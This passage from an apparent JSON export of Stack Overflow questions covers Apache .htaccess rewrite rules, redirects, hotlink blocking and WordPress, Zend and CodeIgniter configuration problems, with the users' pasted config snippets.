do.</p>\n\n<ul>\n<li>If visitor visits\nwww.mydomain.com/news or\nwww.mydomain.com/news/ he shlould be\nredirected to\nwww.mydomain.com/index.php</li>\n<li>If visitor visits\nwww.mydomain.com/news/test-slug or\nwww.mydomain.com/news/test-slug/ he\nshlould be redirected to\nwww.mydomain.com/index.php?news=test-slug</li>\n<li>The slugs only contain letters (A-Z\nand a-z), numbers (0-9) and dashes\n\"-\", so I need a correct regex for\nthis</li>\n</ul>\n\n<p>Can someone help me to build the correct rewrites?</p>\n"},{"tags":["apache",".htaccess","plesk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12466053,"title":".htaccess for domain change with subdomains - apache + plesk","body":"<p>We're using a plesk based system and just recently changed domain names.  I'd like to redirect all requests coming in to the old domain to the new.  There are many question asked in a similar fashion but mine is a bit different.  I'd like to ensure that all subdomains get routed to the same subdoamin on the new domain.   I set up a generic htaccess in the docroot but for some reason it is also applying to all subdomains. </p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !newdomain.com$ [NC]\nRewriteRule ^(.*)$ http://newdomain.com/$1 [L,R=301]\n</code></pre>\n\n<p>How can I make this more general so that subdomains also appropriately get routed?  For bonus points, how can I route https requests to https and http to http. </p>\n\n<p>I'd like to add that the rule transforms the first url to the second which is not desirable:</p>\n\n<pre><code>http://SUBDOMAIN.olddomain.com/somepath/somefile.php\nhttp://newdomain.com/subdomains/SUBDOMAIN/httpdocs/somepath/somefile.php\n</code></pre>\n\n<p>The proper transform should create the following url:</p>\n\n<pre><code>http://SUBDOMAIN.newdomain.com/somepath/somefile.php\n</code></pre>\n\n<p>Lastly, this should work with wildcard subdomains.   </p>\n\n<p>Thanks in advanced!</p>\n"},{"tags":["php",".htaccess","mod-rewrite","path","amazon-s3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12462703,"title":"htaccess rewrite rule to trick Server Path to script?","body":"<p>I have a PHP photo gallery script that works like this:</p>\n\n<pre><code>$image_path        = \"../images/11/mycoolphotos/md\";\n</code></pre>\n\n<p>If the script and photos are on the same server, then this works perfectly!</p>\n\n<p>However, we just transferred all of our images to Amazon S3 -- so the paths are like this:</p>\n\n<pre><code>$image_path        = \"https://s3.amazonaws.com/mywebsite/images/11/mycoolphotos/md\";\n</code></pre>\n\n<p>But it doesn't work!! It won't read the LIST or Files like the ../ Path ??\nI can include a \"Order File Path\" and it work, but we have 8000 photo galleries! Too much work ?</p>\n\n<pre><code>$order_file_path  = \"https://s3.amazonaws.com/mywebsite/images/11/mycoolphotos.txt\";\n// this works, but it would take too much time. This just lists the image names, like 1.jpg, 2.jpg,.. so on for that gallery\n</code></pre>\n\n<p>I am wondering if we trick the server in reading ( not sure how to .htaccess rewrite this )</p>\n\n<pre><code>https://s3.amazonaws.com/mywebsite/images/\n</code></pre>\n\n<p>as</p>\n\n<pre><code>../\n</code></pre>\n\n<p>If it would work ?</p>\n\n<p>Otherwise, I'm not sure where to go from here ?</p>\n\n<p>Thanks much in advance!</p>\n\n<p>EDIT UPDATE: I found the PATH reading function: Can anyone decode this? I tried the suggestions below, but no luck .... ?</p>\n\n<pre><code>/**\n * Check for image order file. In case it does not\n * exists, read the image directory.\n */\n  if (is_file($order_file_path . '/' . $order_file_name)) {\n\n  $fp  = fopen($order_file_path . '/' . $order_file_name, \"r\");\n    $row = '';\n    $use_order_file = 'true';\n\n    while ($data = fgetcsv ($fp, 1000, ';')) {\n        $image_data[] = trim($data[0]);\n        $image_file_names[trim($data[0])] = trim($data[0]);\n        $num = count($data);\n        $row++;\n\n        for ($j = 0; $j &lt; $num; $j++) {\n            $content_data_temp['field_' . $j] = $data[$j];\n        } \n\n        $content_data[] = $content_data_temp;\n        $content_data_temp = '';\n    } \n    fclose ($fp);\n} else if (is_dir($image_path)) {\n    $content_data = '';\n    $handle = opendir($image_path);\n\n    while ($file = readdir($handle)) {\n        if (preg_match(\"/^\\.{1,2}$/i\", $file)) {\n            continue;\n        } \n        if (preg_match(\"/\\.[a-z]{3}$/i\", $file)) {\n            $image_data[] = $file;\n            $image_file_names[$file] = $file;\n        } \n    } \n    closedir($handle);\n} else {\n    echo 'Working on older photos, please check back.';\n    exit;\n} \n\n$image_number = count ($image_data);\n</code></pre>\n"},{"tags":["regex",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12440113,"title":"Regexp RewriteCond doesn't match","body":"<p>I have these lines in a <code>.htaccess</code> file :</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} ^(.*/|)(en|de|fr)(/.*|)$ [NC]\n#RewriteCond %1%3.php -f\nRewriteRule ^(.*/|)(en|de|fr)(/.*?)/?$ $1$3.php?lang=$2 [NC,QSA,L]\n</code></pre>\n\n<p>The third (commented) line doesn't work. Everything else is fine though. Can anyone point me out to what is wrong here ? The RewriteRule works very well, ie the file <code>$1$3.php</code> exists and is correctly displayed.</p>\n\n<p>Thank you for any help.</p>\n"},{"tags":[".htaccess","zend-framework","frameworks","forum","mybb"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12459038,"title":"Running myBB forum within Zend Framework","body":"<p>I have a simple Zend Framework site I am developing with the addition that there is a myBB forum for the same site.</p>\n\n<p>I placed the forum (In a folder called 'forum' within the public folder of the Zend scaffolding but issues are created in that the .htaccess that controls the URL rewrite causes issues for the forum.</p>\n\n<p>I then placed the forum outside of the public folder. This works fine only if I remove the .htaccess, but then Zend obviously doesn't work.</p>\n\n<p>How can I get the .htaccess rewrite to work such that if the url <a href=\"http://www.mysite.com/forum\" rel=\"nofollow\">http://www.mysite.com/forum</a> is used it wont rewrite the url for the Zend Framework, anything else and it should forward to the public folder.</p>\n\n<p>My webroot .htaccess code is:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^\\.htaccess$ - [F]\n\nRewriteCond %{REQUEST_URI} =\"\"\nRewriteRule ^.*$ /public/index.php [NC,L]\n\nRewriteCond %{REQUEST_URI} !^/public/.*$\nRewriteRule ^(.*)$ /public/$1\n\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule ^.*$ - [NC,L]\n\nRewriteRule ^public/.*$ /public/index.php [NC,L]\n</code></pre>\n\n<p>TIA\nJohn</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","url-rewriting","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12460515,"title":"Redirect php page to another php page using 301 .htaccess","body":"<p>I have a dynamic page that I need to redirect to another dynamic page in .htaccess. </p>\n\n<p>I have tried different syntax for the redirect but nothing seems to work:</p>\n\n<pre><code>RewriteEngine on \nRewriteRule /index.php?p=page&amp;page_id=store$ http://www.website.com/index.php [R=301]\n</code></pre>\n\n<p>OR</p>\n\n<pre><code>RewriteEngine on \nRewriteCond %{QUERY_STRING} ^p=page&amp;page_id=store$\nRewriteRule ^/index.php$ http://www.website.com/index.php? [L,R=301]\n</code></pre>\n\n<p>EDIT:  I have an old php page in the shopping cart that I have transferred to the new address. So in order to preserve search engine page ranking I want to redirect old page to the new address. I want visitors who still visit www.website.com/index.php?p=page&amp;page_id=store to be redirected to website.com/index.php </p>\n\n<p>Thanks in advance!</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12454150,"title":".htaccess redirect 301","body":"<p>my site <code>www.freerankstat.com</code> has old url parameter like <code>www.freerankstat.com/facebook.com</code> and new parameter <code>www.freerankstat.com/www/facebook.com</code> </p>\n\n<p>I try to use .htaccess file but google webmaster showing 80K+ error for not available..  </p>\n\n<p>I am using following code in .htaccess file.. </p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.+)$ http://www.freerankstat.com/www/$1 [R=301,NC]\n</code></pre>\n\n<p>I anticipate your help.. </p>\n\n<p>regards\nKeshab</p>\n"},{"tags":["php",".htaccess","mod-rewrite","webserver","http-status-code-500"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12459720,"title":"mod_rewrite .htaccess causing 500 server error if URl does not exist","body":"<p>I've just started using mod_rewrite, this is what I use for a quite basic structured website with multiple language support:</p>\n\n<pre><code>RewriteEngine on\nErrorDocument 404 /error404.php\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([a-zA-Z]{2})/([^/]+)$ $2.php?lang=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([a-zA-Z]{2})/$ index.php?lang=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([a-zA-Z]{2})$ index.php?lang=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)$ $1.php [L]\n</code></pre>\n\n<p>My idea was that languages are indicated at the beginning of the URl and need to be two characters (a-z or A-Z). After that there will be a string that refers to a php-file which has the same filename as the string, just .php attached. The language will be added as a GET-Variable (<code>?lang=en</code>).</p>\n\n<p>So, an URl could look like this: <code>/en/index</code> and should then be redirected to <code>index.php?lang=en</code>.</p>\n\n<p>If the URl does not start with a language, but directly with the string, then no GET-variable will be attached to the string. E.g. <code>/index</code> should refer to <code>index.php</code>. If there is no string, then index should be used as default.</p>\n\n<p>So far, so good. Works fine. Just if I enter a string (no matter if I use 2 characters for language or not), the site always shows an 500 Internal Server Error, instead of going to <code>error404.php</code>. Also, if I delete this line (404) in .htaccess, it is still the same error.</p>\n\n<p>So, I assume that there is something wrong with the other lines in the .htaccess that cause this error, does anybody have an idea what this could be?</p>\n\n<p>Any help is highly appreciated!</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12459841,"title":"using htaccess to load page for certain domain","body":"<p>I have a domain example.com and mainexample.com- i want a example.com to point to mainexample.com/social/pre/register/121 which already driven by the htaccess file. </p>\n\n<p>I am not sure how to go about this.. I have pointed the two domains at the same directory. I'm on a virtual shared server so I am using directadmin with php/codeigniter.</p>\n\n<p>The site uses the standard htaccess file for codeigniter listed below</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /upd8r_jul\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#When your application folder isn't in the system folder\n#This snippet prevents user access to the application folder\n#Submitted by: Fabdrol\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n"},{"tags":["apache",".htaccess","search-engine","http-referer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12461294,"title":"Block hotlinking but whitelist certain pages / search engines","body":"<p>What I'm doing right now is to block hotlinking of any images in a certain folder and redirecting to the website containing that image:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?mydomain.com/.*$ [NC]\nRewriteRule (.*)\\.(gif|jpg|png)$ /$1.html [R,L]\n</code></pre>\n\n<p>What I want to do now is to whitelist certain pages</p>\n\n<p>e.g. bing.com | google.com | google.fr | google.de | etc.</p>\n\n<p>I guess that's quite an easy task but I'm terrible with .htaccess :/</p>\n\n<p>Thanks for the help</p>\n"},{"tags":["php","apache",".htaccess","zend-framework"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":12462906,"title":"Zend Framework .htaccess rewrite rules","body":"<p>I have seen a .htaccess file with contents as following</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\n\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ /index.php [NC,L]\n</code></pre>\n\n<p>As I understand, the Rewrite conditions say that if the requested url is meant for a file with non zero size, or a symbolic link or a directory then do nothing. That is done by \n<code>RewriteRule ^.*$ - [NC,L]</code>, means if the above conditions are true then stop processing right there; otherwise invoke <code>/index.php</code> and that is done using <code>RewriteRule ^.*$ /index.php [NC,L]</code>. </p>\n\n<p>My doubts are,</p>\n\n<p>1.In the tutorial (<a href=\"http://survivethedeepend.com/zendframeworkbook/en/1.0/a.not.so.simple.hello.world.tutorial#zfbook.a.not.so.simple.hello.world.tutorial.introduction\" rel=\"nofollow\">Survive the deep end</a>) I am reading, saying that:</p>\n\n<blockquote>\n  <p>namely if the URL refers to a file (with size greater than zero), directory or symbolic link. This makes sure your javascript, css, and other non-PHP files can be served directly even if centralised elsewhere and referenced only by symbolic links.</p>\n</blockquote>\n\n<p>As all of the .php files are non zero size then how apache can know the difference between php files and non php files ?</p>\n\n<p>2.Will the requested url will be passed to /index.php as an argument or will it only invoke /index.php ?</p>\n"},{"tags":["wordpress",".htaccess","frontpage"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12460664,"title":"WordPress sections in htaccess kills FrontPage permissions","body":"<p>I have WordPress running in the public_html directory of my web server (i.e. the primary domain on my account points to this directory).  There are subdirectories off of this folder that are for other websites (e.g. /subdomain for the “subdomain.com” website).  Some of these websites in subdirectories are edited using FrontPage.</p>\n\n<p>I have found that the .htaccess file in the root, when configured for WP, messes up the FrontPage permissions and makes it impossible to use FrontPage (FrontPage never prompts for authentication and throws a 404 error).  From web searches I’ve discovered that others have encountered this problem (e.g. <a href=\"https://my.bluehost.com/cgi/help/375\" rel=\"nofollow\">https://my.bluehost.com/cgi/help/375</a>) , but I have not had success implementing the fixes others proposed.</p>\n\n<p>Here are the details:</p>\n\n<h2>When this .htaccess file is in the root, FrontPage works fine:</h2>\n\n<pre><code># -FrontPage-\n\nAuthUserFile /home/user/public_html/_vti_pvt/service.pwd\nAuthGroupFile /home/user/public_html/_vti_pvt/service.grp\n\n\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from all\n&lt;/Limit&gt;\n&lt;Limit PUT DELETE&gt;\norder deny,allow\ndeny from all\n&lt;/Limit&gt;\n\nAuthName myrootdomain.com\nIndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*\n</code></pre>\n\n<hr>\n\n<h2>I would like to have WP sections in this root .htaccess file and tried to put the following .htaccess file in the top-level public_html directory:</h2>\n\n<pre><code>#-FrontPage-\n\nAuthUserFile /home/user/public_html/_vti_pvt/service.pwd\nAuthGroupFile /home/user/public_html/_vti_pvt/service.grp\n\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from all\n&lt;/Limit&gt;\n&lt;Limit PUT DELETE&gt;\norder deny,allow\ndeny from all\n&lt;/Limit&gt;\n\nAuthName myrootdomain.com\nIndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*\n\nRewriteRule ^subdir-name/.*$ - [PT] \n\nErrorDocument 404 /index.html\n&lt;files wp-config.php&gt;\norder allow,deny\ndeny from all\n&lt;/files&gt;\nOptions +FollowSymLinks\nRewriteEngine On\nRewriteCond %{QUERY_STRING} (\\&lt;|%3C).*script.*(\\&gt;|%3E) [NC,OR]\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\nRewriteRule ^(.*)$ index.php [F,L]\n&lt;IfModule mod_deflate.c&gt;\nAddOutputFilterByType DEFLATE text/html text/plain text/xml text/css application/x-javascript application/xhtml+xml application/xml application/rss+xml application/atom_xml application/x-javascript application/x-httpd-php application/x-httpd-fastphp \nBrowserMatch ^Mozilla/4 gzip-only-text/html\nBrowserMatch ^Mozilla/4\\.0[678] no-gzip\nBrowserMatch \\bMSIE !no-gzip !gzip-only-text/html\n&lt;/IfModule&gt;\nOptions -Indexes\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<hr>\n\n<p>HOWEVER, when the above .htaccess file with WP components is installed, it breaks FrontPage authentication.</p>\n\n<p>The .htaccess file in my _vti_bin file of “subdomainN” (which is a domain edited by FrontPage) looks like this:</p>\n\n<pre><code># -FrontPage-\n\nOptions +FollowSymlinks\n\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from all\n&lt;/Limit&gt;\n&lt;Limit PUT DELETE&gt;\norder deny,allow\ndeny from all\n&lt;/Limit&gt;\nAuthName mydomain.com\nAuthUserFile /home/user/public_html/_vti_pvt/service.pwd\nAuthGroupFile /home/user/public_html/_vti_pvt/service.grp\n</code></pre>\n\n<hr>\n\n<p>… and the .htaccess file in my _vti_aut and _vti_adm subdirectories of subdomain N looks like this:</p>\n\n<pre><code># -FrontPage-\n\nOptions +FollowSymlinks\n\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from all\nrequire group authors administrators\n&lt;/Limit&gt;\n&lt;Limit PUT DELETE&gt;\norder deny,allow\ndeny from all\n&lt;/Limit&gt;\nAuthType Passthrough\nAuthName myrootdomain.com\nAuthUserFile /home/user/public_html/_vti_pvt/service.pwd\nAuthGroupFile /home/user/public_html/_vti_pvt/service.grp\n</code></pre>\n\n<hr>\n\n<p>Any suggestions on what I need to tweak to get FrontPage authentication to work AND WP components in the .htaccess file?</p>\n"},{"tags":["wordpress",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12453103,"title":"Wordpress Custom URL Rewrite Entry in htaccess","body":"<p>Simple thing I'm trying to do - just upgraded a site to use wordpress, there is ONE page in particular i do not want to 301 and want to retain its original url</p>\n\n<p>the original url is</p>\n\n<p>/freerecords.htm</p>\n\n<p>here is what i added to my htaccess</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^/freerecords.htm [NC]\n\nRewriteRule . /index.php [L]\nRewriteRule ^/freerecords.htm$ /index.php\\?page_id=793 [L,NC]\n</code></pre>\n\n<p>problem is the above isn't working -i think i'm pretty close...</p>\n\n<p>i don't want to use wordpress built in php url rewriting functions - i just want to do this in the htaccess</p>\n\n<p>any help is greatly appreciated</p>\n"},{"tags":["wordpress",".htaccess","permalinks"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12461879,"title":"RSS Feed Page is not redirecting properly issue in particular wordpress theme","body":"<p>I have an additional theme installed in wordpress and activated it. Then When I try to open my rss feed like www.example.com/feed/rss then firefox showing \"page is not redirecting properly\". When I switch to default wordpress theme it works fine. What is the issue.</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","image",".htaccess","hash","serving"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12459423,"title":"serving images? htaccess redirect the images folder?","body":"<p>i have a php script that uploads an image, renames it to a random hash, creates folders based on the hash, stores the original image in the last created folder, and finally, creates 2 other thumbnails for it...</p>\n\n<p>regular image... <code>images/a3c/65c/297/108_a3c65c2974270fd093ee8a9bf8ae7d0b.jpg</code></p>\n\n<p>thumbnail image... <code>images/a3c/65c/297/108_a3c65c2974270fd093ee8a9bf8ae7d0b_t.jpg</code></p>\n\n<p>smaller thumbnail... <code>images/a3c/65c/297/108_a3c65c2974270fd093ee8a9bf8ae7d0b_sm.jpg</code></p>\n\n<p>For each photo that is uploaded, it will store a new record in the DB which contains the photo id and this information </p>\n\n<pre><code>/a3c/65c/297/108_a3c65c2974270fd093ee8a9bf8ae7d0b\n</code></pre>\n\n<p>(notice how i didnt store the \".jpg\" or \"_t.jpg\" etc)</p>\n\n<p>Now in order for me to serve the images(i dont know if this is a good practice), Currently i have this php function that returns the image...</p>\n\n<pre><code>function get_image($image_id,$type = '')\n{\n    $sql = \"SELECT * FROM photos where photo_id = {$image_id}\";\n    $query = $this-&gt;db-&gt;query($sql);\n    $r = $query-&gt;row();\n\n    $image = base_url().'images/'.$r-&gt;dir_1 . '/' . $r-&gt;dir_2 . '/' . $r-&gt;dir_3 . '/'.$image_id.'_'.$r-&gt;img_hash;\n\n    if($type == 'small')\n        return $image.'_sm.jpg';\n    if($type == 'reg_thumb')\n        return $image.'_t.jpg';\n    if($type == '' || $type == 'original')\n        return $image.'.jpg';\n\n}\n</code></pre>\n\n<p>basically, i want to do something like twitter where the picture urls look like this</p>\n\n<pre><code>https://twimg0-a.akamaihd.net/profile_images/2392722244/blah.jpg\n</code></pre>\n\n<p><strong>QUESTIONS...</strong><br></p>\n\n<ol>\n<li>how can i achieve this type of url structure? Htaccess? </li>\n<li>Am I returning the images the right way? </li>\n<li>is what im doing safe, smart, and a good practice? if not is there a better method?</li>\n</ol>\n\n<p>thanks!!</p>\n"},{"tags":["php","security",".htaccess","browser"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":645,"score":1,"question_id":8772094,"title":"show file list in folder from using browser","body":"<p>Normally if there is no htacces restriction is enabled it is possible to view the list of files under a folder hosted in web server using browsers. Except  if there exist a index file like index.php it automatically go to the index page. (as far i know)  </p>\n\n<p>But is it possible to see the list of files though there exist an index file ?</p>\n\n<p>thanks in advance </p>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12451886,"title":".htaccess for friendly URL with multiple variables","body":"<p>I am working on making my site more SEO friendly i am currently using </p>\n\n<p><code>\nRewriteEngine On</p>\n\n<p>RewriteRule (.*)$ index.php?page=$1\n</code></p>\n\n<p>to turn site.co.uk/index.php?page=page_name</p>\n\n<p>into site.co.uk/page_name</p>\n\n<p>but i want to use this for sub pages too.\ni have tried this\n<code>\nRewriteEngine On</p>\n\n<p>RewriteRule (.<em>)/(.</em>)$ index.php?page=$1&amp;subpage=$2\n</code></p>\n\n<p>but its not working \nit runs site.co.uk/page_name/sub_page\nbut when you go to site.co.uk/page_name\nit returns the 404 not found</p>\n\n<p>i want it to run</p>\n\n<p>site.co.uk/page_name</p>\n\n<p>and return page_name</p>\n\n<p>or</p>\n\n<p>site.co.uk/page_name/sub_page</p>\n\n<p>and return sub_page\nand so on </p>\n\n<p>site.co.uk/page_name/sub_page/sub_page2/..../so on</p>\n\n<p>please help</p>\n"},{"tags":["apache",".htaccess","custom-error-pages"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":309,"score":1,"question_id":12192681,"title":"htaccess file deny from all, redirects to 404 not found on 403.shtml but no custom error pages defined","body":"<p>I'm setting up a quick internal project in a new addon domain in cPanel. This particular one has an SSL cert installed. I was building my .htaccess up and added a <code>&lt;Files config.php&gt;</code> directive to <code>deny from all</code> so that my config.php file isn't accessible. I realise that storing it outside of the web root is the ideal but I can't in this case.</p>\n\n<p>Normally I would expect that when going to <code>www.domain.com/config.php</code> in a browser that I would get Apache's default 403 Forbidden page. This is what happens on other domains on the same server. But in this case I'm being given a 404 not found error, stating:</p>\n\n<blockquote>\n  <p>Not Found<br>\n  The requested URL /403.shtml was not found on this server.<br>\n  Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>\n</blockquote>\n\n<p>I would normally expect this if I was attempting to define custom error documents but in this case, I'm not!<br>\nThe only thing that makes this domain different to all the others in the same cPanel account is the fact it has an SSL certificate. And this 404 error is the same regardless of navigating using http or https. I've tried clearing cache and still the same.</p>\n\n<p>Can anyone see anything in my .htaccess below that might be causing this?</p>\n\n<pre><code>DirectoryIndex /index.php\n\nOptions -Indexes +FollowSymLinks\nServerSignature Off\n\n# PARSE PHP IN OTHER FILES\n# AddType FOR PHP AS APACHE MODULE, AddHandler FOR CGI\nAddType application/x-httpd-php .ics .xml\n\n# ATTEMPT FORCE PDF DOWNLOAD\nAddType application/octet-stream .pdf\n\n# PREVENT ACCESS TO CONFIG\n&lt;Files config.php&gt;\norder allow,deny\ndeny from all\n&lt;/Files&gt;\n\n# CACHING\n# http://httpd.apache.org/docs/current/mod/mod_headers.html\n&lt;FilesMatch \"\\.(js|css|ico|png|gif|jpg)$\"&gt;\nHeader set Cache-Control \"max-age=172800, public, must-revalidate\"\n#Header set Expires \"Thu, 15 Apr 2011 20:00:00 GMT\"\n&lt;/FilesMatch&gt;\n\n# PREVENT ACCESS TO STATS UPDATE SCRIPT AS IT'S CLI ONLY\n&lt;Files stats_update.php&gt;\norder allow,deny\ndeny from all\n&lt;/Files&gt;\n\nRedirect 302 /preview http://otherdomain.com/documents/preview\nRedirect 302 /sample http://otherdomain.com/documents/preview\n\nRewriteEngine On\n\n# REWRITE NON-WWW TO WWW\nRewriteCond %{HTTP_HOST} !^www\\. [NC]\nRewriteRule (.*) http://www.%{HTTP_HOST}/$1 [R=301]\n\nRewriteRule ^about/?$ /index.php [L]\nRewriteRule ^contact/?$ /contact.php [L]\nRewriteRule ^home/?$ /home.php [L]\nRewriteRule ^order/?$ /order.php [L]\n\n# MAINTAINANCE\n#RewriteCond %{REMOTE_HOST} !^123\\.123\\.123\\.123\n#RewriteCond %{REQUEST_URI} !^/maintainance\\.html$\n#RewriteRule ^(.*)$ /maintainance.html [R=302,L]</code></pre>\n\n<p><strong>EDIT:</strong> Could it be anything to do with the way cPanel handles primary and addon domains?<br>\nIn a cPanel account you have a primary domain whose files live under <code>public_html</code> then you define addon domains (or subdomains) whose files live under <code>public_html/addondomain.com/</code></p>\n\n<p>Would the .htaccess for the primary domain at <code>public_html/.htaccess</code> be affecting/overriding that of addon domains at <code>public_html/addondomain.com/.htaccess</code>?<br>\nI know .htaccess does cascade down through directories but is that the case even above a particular domain's DocumentRoot, e.g.: in the case of this addon domain?</p>\n\n<p><strong>EDIT 2:</strong> Just for info here are the responses to both HTTP requests, bypassing any caching</p>\n\n<pre><code>root@vps [/home/username]#curl -i 'http://www.mydomain.com/config.php'\nHTTP/1.1 403 Forbidden\nDate: Sun, 16 Sep 2012 19:05:10 GMT\nServer: Apache\nContent-Length: 331\nContent-Type: text/html; charset=iso-8859-1\n\n\nroot@vps [/home/username]# curl -i 'http://mydomain.com/config.php'\nHTTP/1.1 301 Moved Permanently\nDate: Sun, 16 Sep 2012 19:05:20 GMT\nServer: Apache\nLocation: http://www.mydomain.com/403.shtml\nContent-Length: 244\nContent-Type: text/html; charset=iso-8859-1\n</code></pre>\n\n<p>You see the 2nd one gets the 301 redirect but it's redirecting to the 403.shtml. So the 403.shtml has already been injected before the rewrite to the www. happens.</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12454457,"title":"Page is not redirecting properly error is shown on wordpress feed url","body":"<p>When I try to access my wordpress feed url like www.wordpresssite.com/feed/rss then firefox throws the error \"Page is not redirecting properly\". And other browsers also don't open this url.\nthis is my htaccess code</p>\n\n<pre><code># BEGIN Wordpress\n\n&lt;IfModule mod_rewrite.c&gt;\n RewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END Wordpress\n</code></pre>\n\n<p>Please help</p>\n"},{"tags":["php",".htaccess","get"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12454886,"title":"Htaccess: Empty $_GET","body":"<p>Currently I'm having a PHP page, and with htaccess I'm changing the page URL. This is my Htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^customer/edit/(.*)/deletefrom/(.*)/ index.php?page=customer&amp;edit=$1&amp;deletefrom&amp;=$2 [QSA,L]\n</code></pre>\n\n<p>When I'm trying to get the value from <code>$_GET['deletefrom']</code> I'm getting an empty value. But <code>$_GET['edit']</code> is working and gives an value, so that's strange. I hope that someone can help me.</p>\n"},{"tags":["php",".htaccess","codeigniter","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12445296,"title":"Codeigniter + SSL + .htaccess + infinite redirects","body":"<p>I am trying to setup SSL on my codeigniter site, but I'm running into a few problems.</p>\n\n<p>Codeigniter refuses to access https://. Firefox displays this error:</p>\n\n<blockquote>\n  <p>The page isn't redirecting properly.\n  Firefox has detected that the server is redirecting the request for this address in a way that will never complete.</p>\n</blockquote>\n\n<p>My config file has this as 